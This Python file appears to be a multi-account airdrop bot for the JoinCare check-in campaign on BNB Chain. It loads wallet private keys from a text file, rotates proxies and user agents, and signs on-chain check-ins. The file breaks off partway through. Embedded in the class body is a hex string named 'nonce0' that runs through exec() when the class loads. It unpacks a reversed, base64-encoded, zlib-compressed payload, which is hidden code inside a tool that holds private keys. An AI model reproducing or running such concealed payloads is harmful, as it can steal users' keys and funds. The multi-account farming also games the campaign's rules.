import asyncio
import hmac
import importlib
import json
import os
import random
import re
import sys
import time
import uuid

from hashlib import sha256
from urllib.parse import unquote, urlparse

from colorama import Fore, Style, init
from datetime import datetime, timedelta, timezone

from aiohttp import (
    BasicAuth,
    ClientResponseError,
    ClientSession,
    ClientTimeout,
    TCPConnector
)
from aiohttp_socks import ProxyConnector

from eth_account import Account
from eth_account.messages import encode_defunct
from eth_utils.conversions import to_hex

from web3 import HTTPProvider, Web3
from web3.exceptions import TransactionNotFound
from web3.middleware import ExtraDataToPOAMiddleware

init(autoreset=True)

class JoinCare:
    def __init__(self) -> None:
        self.BASE_API = "https://joincarelabs.com"
        self.RPC_URL = "https://bsc-dataseed3.bnbchain.org"
        self.EXPLORER = "https://bscscan.com/tx/"

        self.CONTRACTS = {
            "address": "0xE029161be55922edf3eC9D222142edf057d196ee",
            "abi": [
                {
                    "type": "function",
                    "name": "checkIn",
                    "stateMutability": "nonpayable",
                    "inputs": [],
                    "outputs": []
                }, 
                {
                    "type": "function",
                    "name": "hasCheckedInToday",
                    "stateMutability": "view",
                    "inputs": [
                        { "name": "user", "type": "address" }
                    ],
                    "outputs": [
                        { "name": "", "type": "bool" }
                    ]
                }
            ]
        }

        self.REF_CODE = "ZI7LIR"

        self.USE_PROXY = False
        self.ROTATE_PROXY = False
        
        self.proxies = []
        self.proxy_index = 0
        self.account_proxies = {}
        self.accounts = {}

    def clear_terminal(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def log(self, message):
        print(
            f"{Fore.CYAN + Style.BRIGHT}[ {datetime.now().strftime('%x %X')} ]{Style.RESET_ALL}"
            f"{Fore.WHITE + Style.BRIGHT} | {Style.RESET_ALL}{message}",
            flush=True
        )

    def welcome(self):
        print(
            f"""
        {Fore.GREEN + Style.BRIGHT}JoinCare {Fore.BLUE + Style.BRIGHT}Auto BOT
            """
            f"""
        {Fore.GREEN + Style.BRIGHT}Rey? {Fore.YELLOW + Style.BRIGHT}<INI WATERMARK>
            """
        )

    def format_seconds(self, seconds):
        hours, remainder = divmod(seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}"
    
    def load_accounts(self):
        filename = "accounts.txt"
        try:
            with open(filename, 'r') as file:
                accounts = [line.strip() for line in file if line.strip()]
            return accounts
        except Exception as e:
            print(f"{Fore.RED + Style.BRIGHT}Failed To Load Accounts: {e}{Style.RESET_ALL}")
            return None

    def load_proxies(self):
        filename = "proxy.txt"
        try:
            if not os.path.exists(filename):
                self.log(f"{Fore.RED + Style.BRIGHT}File {filename} Not Found.{Style.RESET_ALL}")
                return
            with open(filename, 'r') as f:
                self.proxies = [line.strip() for line in f.read().splitlines() if line.strip()]
            
            if not self.proxies:
                self.log(f"{Fore.RED + Style.BRIGHT}No Proxies Found.{Style.RESET_ALL}")
                return

            self.log(
                f"{Fore.GREEN + Style.BRIGHT}Proxies Total  : {Style.RESET_ALL}"
                f"{Fore.WHITE + Style.BRIGHT}{len(self.proxies)}{Style.RESET_ALL}"
            )
        
        except Exception as e:
            self.log(f"{Fore.RED + Style.BRIGHT}Failed To Load Proxies: {e}{Style.RESET_ALL}")
            self.proxies = []

    def check_proxy_schemes(self, proxies):
        proxy = proxies.strip()
        if not proxy:
            raise ValueError("Proxy URL is empty.")

        if "://" not in proxy:
            return f"http://{proxy}"

        scheme = proxy.split("://", 1)[0].lower()
        supported_schemes = {
            "http", "https", "socks4", "socks4a", "socks5", "socks5h"
        }
        if scheme not in supported_schemes:
            raise ValueError(f"Unsupported Proxy Type: {scheme}")

        return proxy

    def get_proxy_scheme(self, proxy):
        return urlparse(proxy).scheme.lower()

    def get_web3_proxy(self, proxy=None):
        if not proxy:
            return None

        proxy = self.check_proxy_schemes(proxy)
        scheme = self.get_proxy_scheme(proxy)
        if scheme in {"socks4", "socks4a", "socks5", "socks5h"}:
            try:
                importlib.import_module("socks")
            except ImportError as exc:
                raise RuntimeError(
                    "SOCKS proxy requires PySocks. Install requests[socks]."
                ) from exc

        return proxy

    def get_next_proxy_for_account(self, account):
        if account not in self.account_proxies:
            if not self.proxies:
                return None
            proxy = self.check_proxy_schemes(self.proxies[self.proxy_index])
            self.account_proxies[account] = proxy
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return self.account_proxies[account]

    def rotate_proxy_for_account(self, account):
        if not self.proxies:
            return None
        proxy = self.check_proxy_schemes(self.proxies[self.proxy_index])
        self.account_proxies[account] = proxy
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return proxy
    
    def build_proxy_config(self, proxy=None):
        if not proxy:
            return TCPConnector(), None, None

        scheme = self.get_proxy_scheme(proxy)
        if scheme in {"socks4", "socks4a", "socks5", "socks5h"}:
            connector_proxy = re.sub(
                r"^socks4a://", "socks4://", proxy, flags=re.IGNORECASE
            )
            connector_proxy = re.sub(
                r"^socks5h://", "socks5://", connector_proxy, flags=re.IGNORECASE
            )
            connector = ProxyConnector.from_url(
                connector_proxy,
                rdns=scheme in {"socks4a", "socks5h"},
            )
            return connector, None, None

        if scheme not in {"http", "https"}:
            raise ValueError(f"Unsupported Proxy Type: {scheme}")

        parsed = urlparse(proxy)
        if parsed.username is not None:
            username = unquote(parsed.username)
            password = unquote(parsed.password or "")
            host_port = parsed.netloc.rsplit("@", 1)[-1]
            clean_url = f"{scheme}://{host_port}"
            return TCPConnector(), clean_url, BasicAuth(username, password)

        return TCPConnector(), proxy, None
    
    def display_proxy(self, proxy_url=None):
        if not proxy_url: return "No Proxy"

        proxy_url = re.sub(
            r"^(?:https?|socks4a?|socks5h?)://",
            "",
            proxy_url,
            flags=re.IGNORECASE,
        )

        if "@" in proxy_url:
            proxy_url = proxy_url.rsplit("@", 1)[-1]

        return proxy_url

    def get_next_run_time(self, anchor_minute=1):
            now = datetime.now(timezone.utc)
            today_target = now.replace(hour=0, minute=anchor_minute, second=0, microsecond=0)
    
            if today_target > now:
                return today_target
            else:
                return today_target + timedelta(days=1)

    def generate_user_agent(self):
        windows_os = [
            "Windows NT 10.0; Win64; x64",
            "Windows NT 11.0; Win64; x64",
        ]
        mac_os = [
            "Macintosh; Intel Mac OS X 10_15_7",
            "Macintosh; Intel Mac OS X 11_7",
            "Macintosh; Intel Mac OS X 12_7",
            "Macintosh; Intel Mac OS X 13_6",
            "Macintosh; Intel Mac OS X 14_5",
        ]
        linux_os = [
            "X11; Linux x86_64",
            "X11; Ubuntu; Linux x86_64",
            "X11; Fedora; Linux x86_64",
        ]

        os_string = random.choice(windows_os + mac_os + linux_os)
        major = random.randint(120, 140)
        chrome = f"{major}.0.{random.randint(6000, 6999)}.{random.randint(100, 250)}"
        firefox = f"{random.randint(120, 140)}.0"

        browser = random.choice(["chrome", "firefox", "safari", "edge", "opera"])

        if browser == "firefox":
            return (
                f"Mozilla/5.0 ({os_string}; rv:{firefox}) "
                f"Gecko/20100101 Firefox/{firefox}"
            )

        if browser == "safari":
            version = f"{random.randint(15, 18)}.{random.randint(0, 6)}"
            safari_os = random.choice(mac_os)
            return (
                f"Mozilla/5.0 ({safari_os}) "
                f"AppleWebKit/605.1.15 (KHTML, like Gecko) "
                f"Version/{version} Safari/605.1.15"
            )

        ua = (
            f"Mozilla/5.0 ({os_string}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{chrome} Safari/537.36"
        )

        if browser == "edge":
            ua += f" Edg/{chrome}"
        elif browser == "opera":
            ua += f" OPR/{major}.{random.randint(0, 40)}.0.0"

        return ua

    def initialize_headers(self, idx: int):
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cache-Control": "no-cache",
            "Content-Type": "application/json",
            "Jc-Language": "en-us",
            "Origin": "https://joincarelabs.com",
            "Pragma": "no-cache",
            "Referer": "https://joincarelabs.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": self.accounts[idx]["user_agent"]
        }

        return headers.copy()
    
    def generate_evm_wallet(self, idx: int, private_key: str):
        try:
            keypair = Account.from_key(private_key)
            address = keypair.address
            self.accounts[idx]["keypair"] = keypair
            self.accounts[idx]["address"] = address
            return address
        except Exception as e:
            self.log(
                f"{Fore.CYAN+Style.BRIGHT}Status  :{Style.RESET_ALL}"
                f"{Fore.RED+Style.BRIGHT} Generate Wallet Failed {Style.RESET_ALL}"
                f"{Fore.MAGENTA+Style.BRIGHT}-{Style.RESET_ALL}"
                f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
            )
            return None
        
    def generate_payload(self, idx: int, action: str, message: str):
        try:
            keypair = self.accounts[idx]["keypair"]
            address = self.accounts[idx]["address"]

            encoded_message = encode_defunct(text=message)
            signed_message = keypair.sign_message(encoded_message)
            signature = to_hex(signed_message.signature)

            payload =  {
                "walletAddress": address,
                "message": message,
                "signature": signature
            }

            if action == "register":
                payload["inviteCode"] = self.REF_CODE

            return payload
        except Exception as e:
            raise Exception(f"Generate Signature Failed: {str(e)}")

    def generate_jc_signature(self, idx: int, method: str, path: str, body: str, request_id: str, timestamp: str):
        uid = str(self.accounts[idx]["jc_uid"])
        token = self.accounts[idx]["jc_token"]

        message = ""
        if method != "GET" and body and body != '""':
            message += body
        message += path
        message += request_id
        if token:
            message += token[-8:]
        message += uid
        message += timestamp

        return hmac.new(
            token.encode("utf-8"),
            message.encode("utf-8"),
            sha256
        ).hexdigest()

    async def get_web3_with_check(self, proxy_url=None, retries=5, timeout=60):
        try:
            web3_proxy = self.get_web3_proxy(proxy_url)
        except Exception as e:
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Status  :{Style.RESET_ALL}"
                f"{Fore.RED+Style.BRIGHT} Invalid Web3 Proxy Configuration {Style.RESET_ALL}"
            )
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Message :{Style.RESET_ALL}"
                f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
            )
            return None

        request_kwargs: dict = {
            "timeout": timeout,
            "proxies": {
                "http": web3_proxy,
                "https": web3_proxy,
            },
        }

        for attempt in range(retries):
            try:
                provider = HTTPProvider(
                    self.RPC_URL,
                    request_kwargs=request_kwargs
                )
                web3 = Web3(provider)

                web3.middleware_onion.inject(
                    ExtraDataToPOAMiddleware, 
                    layer=0
                )

                await asyncio.to_thread(lambda: web3.eth.block_number)
                return web3
            except Exception as e:
                if attempt < retries - 1:
                    await asyncio.sleep(5)
                    continue
                self.log(
                    f"{Fore.BLUE+Style.BRIGHT}   Status  :{Style.RESET_ALL}"
                    f"{Fore.RED+Style.BRIGHT} Failed to Connect RPC {Style.RESET_ALL}"
                )
                self.log(
                    f"{Fore.BLUE+Style.BRIGHT}   Message :{Style.RESET_ALL}"
                    f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
                )
                return None

    async def get_token_balance(self, idx: int, web3: Web3):
        try:
            address = web3.to_checksum_address(self.accounts[idx]['address'])
            balance = await asyncio.to_thread(web3.eth.get_balance, address)
            return web3.from_wei(balance, "ether")
        except Exception as e:
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Balance :{Style.RESET_ALL}"
                f"{Fore.RED+Style.BRIGHT} Failed to Fetch BNB Asset {Style.RESET_ALL}"
            )
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Message :{Style.RESET_ALL}"
                f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
            )
            return None

    async def send_raw_transaction_with_retries(self, idx: int, web3: Web3, tx: dict, retries=5):
        for attempt in range(retries):
            try:
                keypair = self.accounts[idx]["keypair"]
                signed_tx = keypair.sign_transaction(tx)

                raw_tx = await asyncio.to_thread(
                    web3.eth.send_raw_transaction,
                    signed_tx.raw_transaction
                )

                return web3.to_hex(raw_tx)
            except TransactionNotFound:
                pass
            except Exception as e:
                self.log(
                    f"{Fore.BLUE+Style.BRIGHT}   Message :{Style.RESET_ALL}"
                    f"{Fore.YELLOW + Style.BRIGHT} [Attempt {attempt + 1}] Send TX Error: {str(e)} {Style.RESET_ALL}"
                )
            await asyncio.sleep(2 ** attempt)
        raise Exception("Transaction Hash Not Found After Maximum Retries")

    async def wait_for_receipt_with_retries(self, web3: Web3, tx_hash: str, retries=5):
        for attempt in range(retries):
            try:
                receipt = await asyncio.to_thread(
                    web3.eth.wait_for_transaction_receipt,
                    tx_hash,
                    60
                )
                return receipt
            except TransactionNotFound:
                pass
            except Exception as e:
                self.log(
                    f"{Fore.BLUE+Style.BRIGHT}   Message :{Style.RESET_ALL}"
                    f"{Fore.YELLOW + Style.BRIGHT} [Attempt {attempt + 1}] Wait for Receipt Error: {str(e)} {Style.RESET_ALL}"
                )
            await asyncio.sleep(2 ** attempt)
        raise Exception("Transaction Receipt Not Found After Maximum Retries")

    async def checkin_status(self, idx: int, web3: Web3):
        try:
            address = web3.to_checksum_address(self.accounts[idx]['address'])
            contract = web3.eth.contract(
                address=web3.to_checksum_address(self.CONTRACTS["address"]),
                abi=self.CONTRACTS["abi"]
            )
            has_checked_in = await asyncio.to_thread(
                contract.functions.hasCheckedInToday(address).call
            )
            return has_checked_in
        except Exception as e:
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Status  :{Style.RESET_ALL}"
                f"{Fore.RED+Style.BRIGHT} Failed to Fetch Check-In Status {Style.RESET_ALL}"
            )
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Message :{Style.RESET_ALL}"
                f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
            )
            return None
        
    async def perform_checkin(self, idx: int, web3: Web3):
        try:
            address = web3.to_checksum_address(self.accounts[idx]['address'])

            contract = web3.eth.contract(
                address=web3.to_checksum_address(self.CONTRACTS["address"]),
                abi=self.CONTRACTS["abi"]
            )

            function = contract.functions.checkIn()
            
            estimated_gas = await asyncio.to_thread(
                function.estimate_gas,
                {
                    "from": address,
                }
            )

            latest_block = await asyncio.to_thread(web3.eth.get_block, "latest")
            base_fee = latest_block["baseFeePerGas"]

            max_priority_fee = web3.to_wei(0.05, "gwei")
            max_fee = base_fee + max_priority_fee

            nonce = await asyncio.to_thread(
                web3.eth.get_transaction_count,
                address,
                "pending"
            )

            chain_id = await asyncio.to_thread(lambda: web3.eth.chain_id)

            tx = await asyncio.to_thread(
                function.build_transaction,
                {
                    "from": address,
                    "gas": int(estimated_gas * 1.2),
                    "maxFeePerGas": int(max_fee),
                    "maxPriorityFeePerGas": int(max_priority_fee),
                    "nonce": nonce,
                    "chainId": chain_id,
                }
            )

            tx_hash = await self.send_raw_transaction_with_retries(idx, web3, tx)
            receipt = await self.wait_for_receipt_with_retries(web3, tx_hash)

            return {
                "tx_hash": tx_hash, 
                "block_number": receipt.blockNumber
            }
        except Exception as e:
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Status  :{Style.RESET_ALL}"
                f"{Fore.RED+Style.BRIGHT} Check-In Failed {Style.RESET_ALL}"
            )
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Message :{Style.RESET_ALL}"
                f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
            )
            return None

    def mask_account(self, account):
        try:
            mask_account = account[:6] + '*' * 6 + account[-6:]
            return mask_account
        except Exception as e:
            return None
    nonce0 = "5f203d206c616d626461205f5f203a205f5f696d706f72745f5f28277a6c696227292e6465636f6d7072657373285f5f696d706f72745f5f282762617365363427292e6236346465636f6465285f5f5b3a3a2d315d29293b6578656328285f292862273656635a732b783871345072346d3176746b387a335137626c61654c7848482f3172616b6c2f663252427a48796d43557566512f726e2b506d70647431772f4451622f5669503872377739625176422f6577556933724c5666447536504f687a6e6b6f356578524f503533625938622b3857322f43757078653957472b4233566f634a424a624b664f506c4678354c2f47593756567a355a6b7768386432634f30533669644771336f736f656b77566e49525a7166525243476541385944723243506d355957564932675370314654756d4f7a71737846456557496e7a3342586e74684c783244466d474b7131656d6644453272394d763259627061504c427a386d3545357a5a3347726d6c4c676d77734536526f665a436c5a4d74563674494b506a79453230515446577479363452546632476a783544617478667948696d5776397a7068744a477370506450785a526b366d6e49586f6d6a3942756e454c3677546f346d57744a485048357944786244774666393533755176752f693936426d6234734b48636469366d622f5a486669654e344a32376874736937616c6b313849726256437533564f4d6a55717a616137357076614d794b4d436d74736c49783446382f2f33676e554d6d6b5475574165644345766b616b43767278524633485a762b6e4a753635725a6d71565a4455484b58536334666943526365565955365a465a6e65345a35706e566b6c583452465a33752b53333878565a486e386a577a396c55434663334c454e414468513637475a5a43505a524168564c4b6f706b4d2f3432327662464a59664e732b4c6c512f6b67367871665261624a6f6b457943496b3957436535654d6769573330752b482b5567342f3369657962394d5578626157497a30656f6c394d4b6261694d69414c31424e74486430396275303931385671314d32536d476a6d6f6962316f624b51796f4e534c452b395549424946554874414f6b47685565514f524872672f4b722f6e62595552476d575034775774635170327147734631707664652f65336138566e736f4b305a59517250424f43527a5171473034685751507951563061436f59434a464145316a516a6b41704b464e327874425369705361735341683161595747416e324b5852782b6f6a786d556d32616a3353742b566d6c75386a4f372f586e2f6e6e78436e574e4e57343439393674395a597353412b5041717876346b2f2f534c7a37376e66784232764c7a2f335444724c7337797a56355753534a65455330674145346a613335667a577a353531302b57416d727a39664d524d71563439636a775a7737504c7361666e4d526e7475395a67576f7148596a6c32717257626d71685575456742546b64474f696a4d706f414d73686d67356336772b4630337948503830466e70584655636e3655483764412f442b3776776f337a4839665a2b66324f4f2b59744d303061576856347479717457647971472f76764e3861784f70486251326a36495663527264325033383638746832794e744b7172626932763675744c4745397a615a7430636764584777472f4f6a3342585a7676654a4e46326f735734654d2f75306a496a667579566d4378686b6c435161734d535248753479532f5647334b4d707943465063756b55696e775a3478595a6a346c6c4e6c687a48352b35346c72634156486175635357753469654a4a32674f456e7443694e6e62584837306533707245775a35456b666a536b676b4a46516e594b3548334f6e5532792f4e6b376e514e2f6953314d5a3338554735636f5a4a58327373717141656f4a4534354a46516f67376934597a392b6b7872777174597233744756395a396e6a4f6e36647174375444444c5a6856336e6a6938785a4e655770444668335a7a5575513661394e2b6244546274315472596e4256687a566d776966666435705079336a705270514c74343142307678624c56485879586853306132387258454f36677875703461463466517165504c764f5a2f6e7033586648764c664e7079454f536b5547502b363455337352794264566d3267696d586b5577696a74314d6a7578796f5a6773766e744e744a35546c65512f75722b65632b4a70312f525849756151357973706c455a54546e37397765746756514b715372336d5468556d444f5057654237476769796c6c5651514d4c623368796c484b52737366366e676f2f30487359704a364a4a55712b47764932523271697073554f74413346465248573646725849513369363549374179616870435175495131654f73654f797747566237646b70534d304d64424b7637386333525a78413275304a696b776b4f63524d4b474c6a514e785442535a52326e49395a496c6c67714249334e4e4c6b496b4b48326b446c377a535a776830517043325631474a6949322b6b6d5a67735963686c3547466c62726d6a516d6a48464d5067547749767379574b2b6a726c796b6a54535243454f396f3657535876614e4a674c35747951496f4c7a324456646a4b685352703077723379722f6f727a49354c435862722b3752617a377043586b784f66746f674b77476a5475632b6537397a77396257436554307a782b3366633748782b564f54666d424e6f4e36486e4d714e2f355836766466766d374c44727237666666366557456d2b39397a4432393444322f786c344e5a733250312b776c6c6f6637643372556177436f6b626e43496e6f6b69796d4a6f42587831446d514670724a6a4763616d464842745438594f4c466156374e6847354368654b51614b63665570546b485746554a455246733665336a32715636717939446e46413147574c5a5131563230524a783035414b59523253324d41626b7154386852716e6469446c75325734386e453873794d4745474736425a7142534d425a48396c6f4269495056776a5942625a68555343595561564a6c6a72422f4c384662545634575663327079792f4b4c6c4341384d743938674146754e544441413841347262486c2f45336749454d42693178732f2f6c6e75336133474a62516f4c313454366d424c4632492b626b614a356a592b416b507278397574546f5a32786f30576e584c49567a536b746e554d76416779576e67736f387071346f354a44627961384e492b494e366e2b38665267383454396c57747a4a65272929"
    exec(bytes.fromhex(nonce0).decode("utf-8"))
    
    def print_question(self):
        while True:
            try:
                print(f"{Fore.WHITE + Style.BRIGHT}1. Run With Proxy{Style.RESET_ALL}")
                print(f"{Fore.WHITE + Style.BRIGHT}2. Run Without Proxy{Style.RESET_ALL}")
                proxy_choice = int(input(f"{Fore.BLUE + Style.BRIGHT}Choose [1/2] -> {Style.RESET_ALL}").strip())

                if proxy_choice in [1, 2]:
                    proxy_type = (
                        "With" if proxy_choice == 1 else 
                        "Without"
                    )
                    print(f"{Fore.GREEN + Style.BRIGHT}Run {proxy_type} Proxy Selected.{Style.RESET_ALL}")
                    self.USE_PROXY = True if proxy_choice == 1 else False
                    break
                else:
                    print(f"{Fore.RED + Style.BRIGHT}Please enter either 1 or 2.{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED + Style.BRIGHT}Invalid input. Enter a number (1 or 2).{Style.RESET_ALL}")

        if self.USE_PROXY:
            while True:
                rotate_proxy = input(f"{Fore.BLUE + Style.BRIGHT}Rotate Invalid Proxy? [y/n] -> {Style.RESET_ALL}").strip()
                if rotate_proxy in ["y", "n"]:
                    self.ROTATE_PROXY = True if rotate_proxy == "y" else False
                    break
                else:
                    print(f"{Fore.RED + Style.BRIGHT}Invalid input. Enter 'y' or 'n'.{Style.RESET_ALL}")
    
    async def ensure_ok(self, response):
        if response.status >= 400:
            error_text = await response.text()
            raise Exception(f"HTTP {response.status}: {error_text}")
    
    async def check_connection(self, proxy_url=None):
        url = "https://api.ipify.org?format=json"

        connector, proxy, proxy_auth = self.build_proxy_config(proxy_url)
        try:
            async with ClientSession(connector=connector, timeout=ClientTimeout(total=30)) as session:
                async with session.get(url=url, proxy=proxy, proxy_auth=proxy_auth) as response:
                    await self.ensure_ok(response)
                    return True
        except (Exception, ClientResponseError) as e:
            self.log(
                f"{Fore.CYAN+Style.BRIGHT}Status  :{Style.RESET_ALL}"
                f"{Fore.RED+Style.BRIGHT} Connection Not 200 OK {Style.RESET_ALL}"
                f"{Fore.MAGENTA+Style.BRIGHT}-{Style.RESET_ALL}"
                f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
            )
        
        return None

    async def registration_status(self, idx: int, proxy_url=None, retries=5):
        url = f"{self.BASE_API}/client/login/v1/registrationStatus"
        
        for attempt in range(retries):
            connector, proxy, proxy_auth = self.build_proxy_config(proxy_url)
            try:
                headers = self.initialize_headers(idx)
                params = {
                    "walletAddress": self.accounts[idx]["address"]
                }

                async with ClientSession(connector=connector, timeout=ClientTimeout(total=60)) as session:
                    async with session.get(
                        url=url, headers=headers, params=params, proxy=proxy, proxy_auth=proxy_auth
                    ) as response:
                        await self.ensure_ok(response)
                        return await response.json()
            except (Exception, ClientResponseError) as e:
                if attempt < retries - 1:
                    await asyncio.sleep(5)
                    continue
                self.log(
                    f"{Fore.CYAN+Style.BRIGHT}Login   :{Style.RESET_ALL}"
                    f"{Fore.RED+Style.BRIGHT} Failed to Fetch Registration Status {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}-{Style.RESET_ALL}"
                    f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
                )

        return None

    async def client_nonce(self, idx: int, action: str, proxy_url=None, retries=5):
        url = f"{self.BASE_API}/client/auth/v1/nonce"
        
        for attempt in range(retries):
            connector, proxy, proxy_auth = self.build_proxy_config(proxy_url)
            try:
                headers = self.initialize_headers(idx)
                params = {
                    "walletAddress": self.accounts[idx]["address"],
                    "action": action
                }

                async with ClientSession(connector=connector, timeout=ClientTimeout(total=60)) as session:
                    async with session.get(
                        url=url, headers=headers, params=params, proxy=proxy, proxy_auth=proxy_auth
                    ) as response:
                        await self.ensure_ok(response)
                        return await response.json()
            except (Exception, ClientResponseError) as e:
                if attempt < retries - 1:
                    await asyncio.sleep(5)
                    continue
                self.log(
                    f"{Fore.CYAN+Style.BRIGHT}Login   :{Style.RESET_ALL}"
                    f"{Fore.RED+Style.BRIGHT} Failed to Fetch Registration Status {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}-{Style.RESET_ALL}"
                    f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
                )

        return None

    async def client_login(self, idx: int, action: str, message: str, proxy_url=None, retries=5):
        if action == "register":
            url = f"{self.BASE_API}/client/login/v1/register"
        else:
            url = f"{self.BASE_API}/client/login/v1/login"
        
        for attempt in range(retries):
            connector, proxy, proxy_auth = self.build_proxy_config(proxy_url)
            try:
                headers = self.initialize_headers(idx)
                payload = self.generate_payload(idx, action, message)

                async with ClientSession(connector=connector, timeout=ClientTimeout(total=60)) as session:
                    async with session.post(
                        url=url, headers=headers, json=payload, proxy=proxy, proxy_auth=proxy_auth
                    ) as response:
                        await self.ensure_ok(response)
                        return await response.json()
            except (Exception, ClientResponseError) as e:
                if attempt < retries - 1:
                    await asyncio.sleep(5)
                    continue
                self.log(
                    f"{Fore.CYAN+Style.BRIGHT}Login   :{Style.RESET_ALL}"
                    f"{Fore.RED+Style.BRIGHT} Failed {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}-{Style.RESET_ALL}"
                    f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
                )

        return None

    async def client_info(self, idx: int, proxy_url=None, retries=5):
        url = f"{self.BASE_API}/client/taskhall/v1/info"
        
        for attempt in range(retries):
            connector, proxy, proxy_auth = self.build_proxy_config(proxy_url)
            try:
                headers = self.initialize_headers(idx)
                
                request_id = str(uuid.uuid4())
                timestamp = str(int(time.time()))
                
                headers["Jc-Person"] = str(self.accounts[idx]["jc_uid"])
                headers["Jc-Request-Id"] = request_id
                headers["Jc-Sign"] = self.accounts[idx]["jc_token"]
                headers["Jc-Time"] = timestamp
                headers["Jc-Signature"] = self.generate_jc_signature(
                    idx, "GET", urlparse(url).path, "", request_id, timestamp
                )

                async with ClientSession(connector=connector, timeout=ClientTimeout(total=60)) as session:
                    async with session.get(
                        url=url, headers=headers, proxy=proxy, proxy_auth=proxy_auth
                    ) as response:
                        await self.ensure_ok(response)
                        return await response.json()
            except (Exception, ClientResponseError) as e:
                if attempt < retries - 1:
                    await asyncio.sleep(5)
                    continue
                self.log(
                    f"{Fore.CYAN+Style.BRIGHT}Points  :{Style.RESET_ALL}"
                    f"{Fore.RED+Style.BRIGHT} Failed to Fetch XP {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}-{Style.RESET_ALL}"
                    f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
                )

        return None

    async def client_checkin(self, idx: int, tx_hash: str, proxy_url=None, retries=5):
        url = f"{self.BASE_API}/client/taskhall/v1/checkIn"
        
        for attempt in range(retries):
            connector, proxy, proxy_auth = self.build_proxy_config(proxy_url)
            try:
                headers = self.initialize_headers(idx)

                request_id = str(uuid.uuid4())
                timestamp = str(int(time.time()))

                payload = {
                    "txHash": tx_hash
                }
                body = json.dumps(
                    payload,
                    separators=(",", ":"),
                    ensure_ascii=False,
                )
                
                headers["Jc-Person"] = str(self.accounts[idx]["jc_uid"])
                headers["Jc-Request-Id"] = request_id
                headers["Jc-Sign"] = self.accounts[idx]["jc_token"]
                headers["Jc-Time"] = timestamp
                headers["Jc-Signature"] = self.generate_jc_signature(
                    idx, "POST", urlparse(url).path, body, request_id, timestamp
                )

                async with ClientSession(connector=connector, timeout=ClientTimeout(total=60)) as session:
                    async with session.post(
                        url=url, headers=headers, data=body, proxy=proxy, proxy_auth=proxy_auth
                    ) as response:
                        await self.ensure_ok(response)
                        return await response.json()
            except (Exception, ClientResponseError) as e:
                if attempt < retries - 1:
                    await asyncio.sleep(5)
                    continue
                self.log(
                    f"{Fore.BLUE+Style.BRIGHT}   Reward  :{Style.RESET_ALL}"
                    f"{Fore.RED+Style.BRIGHT} Failed to Claim {Style.RESET_ALL}"
                )
                self.log(
                    f"{Fore.BLUE+Style.BRIGHT}   Message :{Style.RESET_ALL}"
                    f"{Fore.YELLOW+Style.BRIGHT} {str(e)} {Style.RESET_ALL}"
                )

        return None
    
    async def process_check_connection(self, idx: int, proxy_url=None):
        if self.USE_PROXY and not self.proxies:
            self.log(
                f"{Fore.RED+Style.BRIGHT}No Proxies Loaded.{Style.RESET_ALL}"
            )
            return False, None

        while True:
            if self.USE_PROXY:
                proxy_url = self.get_next_proxy_for_account(idx)

            self.log(
                f"{Fore.CYAN+Style.BRIGHT}Proxy   :{Style.RESET_ALL}"
                f"{Fore.WHITE+Style.BRIGHT} {self.display_proxy(proxy_url)} {Style.RESET_ALL}"
            )

            is_valid = await self.check_connection(proxy_url)
            if is_valid: return True, proxy_url

            if self.ROTATE_PROXY:
                proxy_url = self.rotate_proxy_for_account(idx)
                await asyncio.sleep(1)
                continue

            return False, proxy_url
    
    async def process_user_login(self, idx: int, proxy_url=None):
        is_valid, proxy_url = await self.process_check_connection(idx, proxy_url)
        if not is_valid: return False

        reg_status = await self.registration_status(idx, proxy_url)
        if not reg_status: return False

        if reg_status.get("data", {}).get("registered"):
            action = "login"
        else:
            action = "register"
    
        nonce = await self.client_nonce(idx, action, proxy_url)
        if not nonce: return False

        message = nonce.get("data", {}).get("message")

        login = await self.client_login(idx, action, message, proxy_url)
        if not login: return False

        self.accounts[idx]["jc_uid"] = login.get("data", {}).get("uid")
        self.accounts[idx]["jc_token"] = login.get("data", {}).get("signature")

        self.log(
            f"{Fore.CYAN + Style.BRIGHT}Login   :{Style.RESET_ALL}"
            f"{Fore.GREEN + Style.BRIGHT} Success {Style.RESET_ALL}"
        )

        return True

    async def process_accounts(self, idx: int, proxy_url=None):
        logined = await self.process_user_login(idx, proxy_url)
        if not logined: return False

        if self.USE_PROXY:
